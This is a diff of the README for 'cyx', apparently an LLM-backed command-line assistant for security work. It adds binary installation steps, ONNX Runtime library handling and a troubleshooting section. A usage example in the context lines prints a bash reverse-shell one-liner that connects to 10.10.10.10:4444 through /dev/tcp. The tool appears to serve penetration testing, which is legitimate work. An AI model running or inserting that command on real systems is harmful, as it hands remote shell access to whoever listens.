@@ -29,28 +29,82 @@ cyx --learn "linux privilege escalation"
 
 ## Installation
 
-### Prerequisites
+### Option 1: Download Pre-built Binary (Recommended)
+
+Download the latest release for your platform from the [Releases page](https://github.com/neur0map/cyx/releases).
+
+**Important**: The archive contains both the `cyx` binary and the required ONNX Runtime library. Both files must be kept together.
+
+#### Linux/macOS Installation
+
+**System-wide (recommended):**
+```bash
+# Extract the archive
+tar -xzf cyx-v0.2.0-linux-x86_64.tar.gz
+cd cyx-v0.2.0-linux-x86_64
+
+# Install to system
+sudo cp cyx /usr/local/bin/
+sudo cp libonnxruntime* /usr/local/lib/
+sudo ldconfig  # Linux only
+
+# Run setup
+cyx setup
+```
+
+**Local installation:**
+```bash
+# Extract and copy to local bin
+tar -xzf cyx-v0.2.0-linux-x86_64.tar.gz
+cd cyx-v0.2.0-linux-x86_64
+mkdir -p ~/.local/bin
+cp cyx ~/.local/bin/
+cp libonnxruntime* ~/.local/bin/
+
+# Add to PATH (if not already there)
+echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
+source ~/.bashrc
+
+# Run setup
+cyx setup
+```
+
+### Option 2: Build from Source
+
+#### Prerequisites
 
 - Rust 1.70 or higher
 - API key from [Perplexity](https://www.perplexity.ai/settings/api) or [Groq](https://console.groq.com)
 
-### Build from Source
+#### Build Instructions
 
 ```bash
 git clone https://github.com/neur0map/cyx.git
 cd cyx
 cargo build --release
-
-# Optional: install to PATH
-cargo install --path .
 ```
 
-### Using the Makefile
+**Important for `cargo install` users:**
+
+If you use `cargo install --path .`, you must **manually copy the ONNX Runtime library** to the same directory as the installed binary:
 
 ```bash
-make build    # Build and create symlink
+# Install the binary
+cargo install --path .
+
+# Find where cargo installed it (usually ~/.cargo/bin)
+INSTALL_DIR=$(dirname $(which cyx))
+
+# Copy the library from the build
+cp target/release/libonnxruntime* $INSTALL_DIR/
+```
+
+**Recommended:** Use the Makefile which handles this automatically:
+
+```bash
+make build    # Build and create symlink for development
 make check    # Run fmt + clippy
-make install  # Install to system PATH
+make install  # Install to system PATH (includes library)
 make setup    # Run setup wizard
 make help     # Show all commands
 ```
@@ -135,6 +189,38 @@ Provides detailed explanations with flag breakdowns, protocol details, and alter
 $ cyx -q "reverse shell bash"
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
+
+## Troubleshooting
+
+### Error: libonnxruntime.so.1.16.0: cannot open shared object file
+
+This error means the ONNX Runtime library is not in the library search path. This happens when:
+
+1. You downloaded just the binary without the library
+2. The library is not in the same directory as the binary
+3. The library is not in a system library directory
+
+**Solutions:**
+
+1. **Download the full release package** from the [Releases page](https://github.com/neur0map/cyx/releases) (not just the binary)
+
+2. **Keep the library with the binary**: Extract the full archive and ensure both files are together:
+   ```bash
+   # Both files should be in the same directory
+   ls -l
+   # Should show both:
+   # cyx
+   # libonnxruntime.so.1.16.0 (or .dylib on macOS)
+   ```
+
+3. **Install the library system-wide**:
+   ```bash
+   # Copy from the extracted archive
+   sudo cp libonnxruntime* /usr/local/lib/
+   sudo ldconfig  # Linux only
+   ```
+
+For more detailed troubleshooting, see [BUILDING.md](BUILDING.md).
 
 ## Technical Details
 
